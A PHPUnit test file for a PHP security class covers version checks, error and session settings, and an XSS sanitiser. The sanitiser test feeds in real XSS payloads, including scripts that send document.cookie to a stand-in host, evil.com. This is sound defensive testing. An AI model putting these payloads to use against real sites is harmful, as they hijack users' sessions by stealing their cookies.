<?php

namespace Mixset\Security;

use ReflectionObject;

require_once 'src/Security.php';

class SecurityTest extends \PHPUnit_Framework_TestCase
{
    private $security;

    public function setUp()
    {
        $this->security = new Security();
    }

    public function testEmptyRequiredPHPVersionException()
    {
        $this->expectExceptionMessage('Required PHP Version is not specified. Cannot check required version.');

        $this->security->checkPHPVersion();
    }

    public function testRequiredPHPVersionException()
    {
        $this->expectExceptionMessage('System requires PHP in 5.2.0 version or greater.');

        $this->security->setPHPVersion('5.2.0');
        $this->security->checkPHPVersion();
    }

    public function testErrorReportingSetter()
    {
        $this->security->setErrorReporting(0);

        $this->assertEquals(0, $this->security->getErrorReporting());
    }

    public function testDisplayErrorSetter()
    {
        $this->security->setDisplayErrors(1);

        $this->assertEquals(1, $this->security->getDisplayErrors());
    }

    public function testLibraryPathSetter()
    {
        $this->security->setLibraryPath('/libs/');

        $this->assertContains('/libs/', $this->security->getLibraryPath());
    }

    public function testPHPVersionSetter()
    {
        $this->security->setPHPVersion(7);

        $this->assertEquals(7, $this->security->getPHPVersion());
    }

    public function testErrorReportingConfiguration()
    {
        $this->security->setErrorReporting(1);
        $this->security->setDisplayErrors(1);

        $this->makeMethodAccessible(
            $this->security,
            'configureErrorReporting'
        );

        $this->assertEquals(1, error_reporting());
        $this->assertEquals(1, ini_get('display_errors'));
    }

    public function testConfigureSessionConstants()
    {
        $this->makeMethodAccessible(
            $this->security,
            'configureSessionConstants'
        );

        $this->assertEquals(1, ini_get('session.use_cookies'));
        $this->assertEquals(1, ini_get('session.use_only_cookies'));
        $this->assertEquals(0, ini_get('session.use_trans_sid'));
    }

    public function testXssClean()
    {
        $string = [
            '<script>window.open("http://evil.com/stealer.php?cookie=" + document.cookie, "_blank");</script>',
            '<form action="/form.php" onload="alert(\'Test\');" method="POST">',
            '<a href="#" onmouseover="window.location=\'http://evil.com/cookie.php?cookie= + document.cookie.escape();">Evil</a>',
            '<script>alert(document.cookie);</script>',
            '<img src="javascript:alert(\'XSS\')">',
            'index.php?name=<script>window.onload = function() {var link=document.getElementsByTagName(\'a\');link[0].href="http://example.com/";}</script>',
        ];

        $this->assertEquals('window.open("http://evil.com/stealer.php?cookie=" + document.cookie, "_blank");', $this->security->xssClean($string[0]));
        $this->assertEquals('<form action="/form.php" >', $this->security->xssClean($string[1]));
        $this->assertEquals('<a href="#" >Evil</a>', $this->security->xssClean($string[2]));
        $this->assertEquals('alert(document.cookie);', $this->security->xssClean($string[3]));
        $this->assertEquals('<img src="nojavascript...alert(\'XSS\')">', $this->security->xssClean($string[4]));
        $this->assertEquals('index.php?name=window.onload = function() {var link=document.getElementsByTagName(\'a\');link[0].href="http://example.com/";}', $this->security->xssClean($string[5]));
    }

    public function makeMethodAccessible($object, $method)
    {
        $reflector = new ReflectionObject($object);
        $method = $reflector->getMethod($method);
        $method->setAccessible(true);
        return $method->invoke($object);
    }
}
